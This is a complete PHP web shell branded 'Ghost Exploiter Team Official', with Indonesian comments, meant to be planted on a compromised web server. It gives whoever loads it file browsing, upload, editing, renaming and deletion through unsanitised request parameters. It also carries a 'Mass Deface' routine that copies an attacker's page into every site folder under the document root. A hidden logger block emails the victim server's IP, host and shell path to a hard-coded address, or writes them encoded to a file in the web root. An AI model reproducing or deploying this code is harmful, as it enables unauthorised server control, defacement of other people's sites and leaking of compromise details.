<!-- 
 -->

<?php

$xNamashell = "b3p45.php";//isi nama file mu

error_reporting(0);

if (isset($_GET['dir'])) {
	$dir = $_GET['dir'];
} else {
	$dir = getcwd();
}
?>

<!DOCTYPE php>
<php>
<head>
	<title>webshell</title>
</head>

<style>
@import url("https://fonts.googleapis.com/css?family=New+Rocker|Shadows+Into+Light&display=swap");
* {
	font-family: monospace;
	font-weight: 800;
}
body {
	font-size: 120%;
	color: #fff;
	padding: 0;
	margin: 25% 10% 10% 10%;
	background-color: #111;
	text-shadow: rgba(0,0,0,1) 2px 2px 0.1em;
}
table {
	margin: auto;
	margin-bottom: 20px;
	width: 96%;
}
table td {
	transition: all .5s;
}
.data-table {
	border-collapse: collapse;
	font-size: 110%;
	min-width: 600px;
}
.data-table th, 
.data-table td {
	border: none;
	padding: 7px 15px;
	width: 33%;
}
h3.title{
	margin-bottom: 20px;
	margin-top: 0px;
	text-align: left;
	background-color: #f00;
	padding: 10px;
	font-weight: 900;
	font-size: 160%;
	font-family: New Rocker;
}
.data-table tbody td {
	color: #fff;
	background-color: #282828;
}
.data-table tbody td:nth-child(4),
.data-table tbody td:last-child {
	text-align: left;
}
.data-table tbody td:first-child{
	text-align: left;
}
.data-table tbody tr:nth-child(odd) td {
	background-color: #222;
}
.data-table tbody tr:hover td {
	background-color: #151515;
	border-color: #ccc;
}
.data-table tbody tr.stamp td {
	color: #fff;
	background-color: #000;
}
.data-table tbody tr.data td.nick {
	color: #f00;
}
.kotak{
	border: 2px solid #f00;
	width: 100%;;
	border-radius: 6px;
	box-shadow: rgba(0,0,0,1) 3px 3px 5em;
	padding-bottom: 10px;
}
.btn{
	background-color: #f00;
	border-radius: 5px;
	border: 2px solid red;
	width: 75px;
	height: 27px;
	font-size: 0.8em;
	font-weight: 600;
	color: #fff;
	outline: none;
	margin: 4px;
	font-weight: 900;
	padding: 2px 3px;
	text-shadow: none;
}
.btn:hover{
	box-shadow: 0px 0px 2px 2px darkred;
}

a{
	color: #fff;
	text-decoration: none;
}
a:hover{
	color: #fff;
}
.nav_up{
	margin: 2%;;
	margin-top: 0px;
}
.stamp th{
	font-size: 140%;
}
.dirname{
	color: #f00;
}
.filename{
	color: #fff;
}
input.btn.mini{
	width: 35px;
	height: 24px;
}
.dirnav{
	margin-bottom: 20px;
}
.dirnav a{
	color: lime;
}
textarea{
	width: 95.5%;
	height: 400px;
}
.balik{
	margin-right: 200px;
}
.data-table th.det, 
.data-table td.det{
	width: 40%;
}
.fileinput{
	width: 100px;
}
.newf{
	width: 90px;
}
.hide{
	display: none;
}
.rmf{
	margin-right: -5px;
}
.go{
	background-color: green;
	border: none;
}
.go:hover{
	box-shadow: 0px 0px 2px 2px darkgreen;
}
.fitur{
	text-align: right;
	margin-top: -15px;
	margin-right: 1%;
}
.massarea{
	font-size: 60%;
	margin: 2%;
}
.mass{
	margin-left: 2%;
	margin-top: 1%;
	margin-right: 2%;
	font-size: 60%;
}
.massresult{
	margin-top: 8%;
	font-size: 80%;
	margin-left: 2%;
	text-align: left;
}
.inputmass{
	text-align: left;
}
.massbt{
	font-size: 60%;
}
.massform{
	margin-top: 6%;
}
</style>
<body>
<div class="kotak">
	<h3 class="title">Ghost Exploiter Team Official</h3>
	<div class="fitur">
			<button type="button" class="btn massbt" onclick="display('tabel','massform')">Mass Deface</button>
	</div>
	<div class="nav_up">

<?php
		$dir = str_replace("\\", "/", $dir);
		$dirs = explode("/", $dir);
	
		foreach ($dirs as $key => $value) {
			if ($value == "" && $key == 0){
				echo '<h3 class="dirnav">Directory >> <a href="/">/</a>'; continue;
			} echo '<a href="?dir=';
	
			for ($i=0; $i <= $key ; $i++) { 
				echo "$dirs[$i]"; if ($key !== $i) echo "/";
			} echo '">'.$value.'</a>/';
	}
	echo '</h3>';
	if (isset($_POST['submit'])){
	
		$namafile = $_FILES['upload']['name'];
		$tempatfile = $_FILES['upload']['tmp_name'];
		$tempat = $_GET['dir'];
		$error = $_FILES['upload']['error'];
		$ukuranfile = $_FILES['upload']['size'];
	
		move_uploaded_file($tempatfile, $dir.'/'.$namafile);
				echo "
					<script>alert('file terupload!');</script>
					";
	}
	?>
	<form method="post" enctype="multipart/form-data">
	<input type="file" name="upload">
	<input type="submit" name="submit" value="Upload">
	</form>
	</div>
<center>
<!--Mass Deface-->
<?php
echo "
	<form method='post' class='hide massform' id='massform'>
	<font color='#f00' size='6px'>Mass Deface Auto Detect Domain</font><br><br><br>
		<div class='inputmass'>
		<input class='mass' type='text' name='pwd' size='50' value='$dir'><font color='silver' size='1px'>/*Ubah Ke document_root untuk mass deface*/</font><br>
		<input class='mass' type='text' name='namasc' size='50' placeholder='namafile.ext'><br>
		</div>
		<textarea name='scdeface' width='400px' placeholder='scdeface' class='massarea'></textarea>
		<input type='submit' name='massdef' value='Start' class='btn edt'><br>
	</form>";
?>
<!--Table-->
	<table class="data-table" id="tabel">
		<thead>
			<tr class="stamp">
				<th>File / Folder</th>
				<th>Size</th>
				<th>Action</th>
			</tr>
		</thead>
		<tbody>
		<tr>
			<td style="color: lime">.</td>
			<td style="color: lime"><center>-</center></td>
			<td><center>
			<div id="divneww" style="display:none">
			<form method="POST">
			<input name="newflname" class="fileinput" type="text" size="20" placeholder="namafile"/>
			<input type="submit" value="Go" class="btn mini go" name="newfile"/>
			</form>
			</div>
			<?php
			echo '<div id="divnew"><button class="btn newf" onclick=\'display("divnew","divneww")\'>+New File</button></div>';
			?>
			</center>
			</td>
		</tr>
	<?php

	$scan = scandir($dir);

foreach ($scan as $directory) {
	if (!is_dir($dir.'/'.$directory) || $directory == '.' || $directory == '..') continue;

	echo '
	<tr class="data">
	<td class="det">
	<a class="dirname" href="?dir='.$dir.'/'.$directory.'">'.dirlimit($directory).'</a>
	</td>
	<td style="color: red;"><center>--</center></td>
	<td>
	<center>';
	echo '<form method="POST" id="'.clearspace($directory).'_form" class="hide">
	<input name="newname" class="fileinput" type="text" size="20" value="'.$directory.'" />
	<input type="hidden" name="path" value="'.$dir.'">
	<input type="hidden" name="oldname" value="'.$directory.'">
	<input type="submit" value="Go" class="btn mini go"/>
	</form>';
	echo '<div id="'.clearspace($directory).'_link">
	<form method="post">
	<input type="hidden" value="'.$dir.'/'.$directory.'" name="dirdl">
	<input type="hidden" value="'.$dir.'" name="dirpath">
	<input type="submit" value="del" name="rmdir" class="btn mini">';
	echo '<a class="btn" href=\'javascript:display("'.clearspace($directory).'_link","'.clearspace($directory).'_form");\'>ren</a>';
	echo '</form>
	</div>
	</center>
	</td>
	</tr>
	';
	}
foreach ($scan as $file) {
	if (!is_file($dir.'/'.$file)) continue;

	$jumlah = filesize($dir.'/'.$file)/1024;
	$jumlah = round($jumlah, 3);
	if ($jumlah >= 1024) {
		$jumlah = round($jumlah/1024, 2).'MB';
	} else {
		$jumlah = $jumlah .'KB';
	}

	echo '
	<tr>
	<td><a class="filename" href="?dir='.$dir.'&open='.$dir.'/'.$file.'">'.wordlimit($file).'</a></td>
	<td style="color: lime;"><center>'.$jumlah.'</center></td>
	<td><center>';
	echo '<form method="POST" id="'.clearfile($file).'_form" class="hide">
	<input name="newname" class="fileinput" type="text" size="20" value="'.$file.'" />
	<input type="hidden" name="path" value="'.$dir.'">
	<input type="hidden" name="oldname" value="'.$file.'">
	<input type="submit" value="Go" class="btn mini go"/>
	</form>';
	echo '
	<div id="'.clearfile($file).'_link">
	<form method="post">
	<input type="hidden" value="'.$dir.'/'.$file.'" name="filedl">
	<input type="hidden" value="'.$dir.'" name="filepath">
	<input type="submit" value="del" name="rmfile" class="btn mini rmf">
	<a href="?dir='.$dir.'&ubah='.$file.'" class="btn">edt</a>';
	echo '<a class="btn" href=\'javascript:display("'.clearfile($file).'_link","'.clearfile($file).'_form");\'>ren</a>';
	echo '</form></div></center>
	</td>
	</tr>
	';
}

echo '
	</tbody>
	</table>
';

/*action*/
if (isset($_GET['open'])) {
	echo '
	<br />
	<style>
		table{
			display: none;
		}
	</style>
	<textarea>'.htmlspecialchars(file_get_contents($_GET['open'])).'</textarea>
	';
}

if (isset($_POST['rmfile'])) {
	if (unlink($_POST['filedl'])) {
		echo "<script>alert('Delete Ok !');window.location='?dir=".$_POST['filepath']."';</script>";
	}
}

if (isset($_POST['rmdir'])){
	if(rmdir($_POST['dirdl'])){
		echo "<script>alert('Delete Ok !');window.location='?dir=".$_POST['dirpath']."';</script>";
	}
}

if(isset($_GET['ubah'])){
	if(isset($_POST['edit'])){
		$fp = fopen($_POST['object'], 'w');
		if(fwrite($fp,$_POST['edit'])){
			echo "<script>alert('Edit Ok !');window.location='?dir=".$_GET['dir']."';</script>";
		}else{
			err();
		}
		fclose($fp);
	}
	
$hell = $_GET['dir'];
$yeah = $_GET['ubah'];
$patc = "$hell/$yeah";

echo '<style>
			table {
				display: none;
			}
		</style>

		<form method="post" action="">
		<input type="hidden" name="object" value="'.$patc.'">
		<textarea name="edit">'.htmlspecialchars(file_get_contents($patc)).'</textarea>
		<a href="?dir='.$dir.'" class="balik"><=Back</a>
		<button type="submit" name="go" value="Submit" class="btn edt">Liking</button>
		</form>
		';
}
if(isset($_POST['newname'])){
	if(rename($_POST['path'].'/'.$_POST['oldname'], $_POST['path'] . '/' .$_POST['newname'])){
		ok();
	}else{
		err();
	}
}
if(isset($_POST['newfile'])){
	$newfl = $dir. '/' . $_POST['newflname'];
	if(isset($newfl)){
	if(fopen($newfl,'w')){
		ok();
	}else{
		err();
	}
	}
}
if(isset($_POST['massdef'])){
echo '<style>
			table {
				display: none;
			}
		</style>';
$nama = $_POST['namasc'];
$sc = $_POST['scdeface'];
$bikin = fopen($nama, "w");
		 fwrite($bikin, $sc);
		 fclose($bikin);
$root = $_POST['pwd'];
$scan = scandir($root);
echo "<div class='massresult'>";
echo "<font color='lime'>[ DETECTED DOMAINS ] : </font><br><br><textarea>";
foreach ( $scan as $a ) {
	$dir = $a;
	$full = $root.'/'.$a.'/'.$nama;
	$ekse = @copy($nama, $full);
	if($ekse) { 
	/*filtering dikit :v*/
		if(preg_match('/[\w]+[.]+[a-z]+/i', $dir,$match)) {
			echo "http://$dir/$nama\n";
		}
	}
}
echo "\n\nNB : Kalo ada dir/domain yang gak terdetect isi sendiri yak :v\nPutra Gans tq</textarea>";
echo "</div>";
}
/*function*/
function wordlimit($file,$limit=26){
	if(strlen($file)>$limit)
	$word = mb_substr($file,0,$limit-3)."<font color=#f00>...</font>";
	else
	$word = $file;
	return $word;          
}
function dirlimit($directory,$limit=22){
	if(strlen($directory)>$limit)
	$dirlim = mb_substr($directory,0,$limit-3)."<font color=#fff>...</font>";
	else
	$dirlim = $directory;
	return $dirlim;          
}
function ok(){
	echo "<script>alert('Berhasil !');window.location='';</script>";
}
function err(){
	echo "<script>alert('Gagal !');window.location='';</script>";
}
function clearspace($directory){
	return str_replace(" ","_",$directory);
}
function clearfile($file){
	return str_replace(" ","_",$file);
}

?>
<!--Logger-->
<?php
$ip = getenv("REMOTE_ADDR");
$root = $_SERVER['DOCUMENT_ROOT'];
$sub = "Logger Notice !!";
$email = "hackerafee@gmail.com"; //isi email lu
$from = "Setor Shell";
$file = $_SERVER['REQUEST_URI'];
$web = $_SERVER['HTTP_HOST'];
$ipz = $ip . "";
$uatama = "IP : $ipz<br><br>Website : $web<br>Filepath : <font color=green>$web$file</font><br>";
//ini kalo gak ada fitur mailer :v
if(!mail($email, $sub, $uatama, $from)){
	$newfl = $root. '/' . "webdocs.txt";
	$pesta = "IP : $ipz\n\nFilepath : $web$file\nPeace :p";
	if(isset($newfl)){
		$write = fopen($newfl,'w');
		$txt = base64_encode(str_rot13($pesta));
		fwrite($write, $txt);
		fclose($write);
	}
};
?>

<script type="text/javascript">
	function display(hide,show){
		document.getElementById(hide).style.display = 'none';
		document.getElementById(show).style.display = 'block';
	}
</script>
</body>
</html>
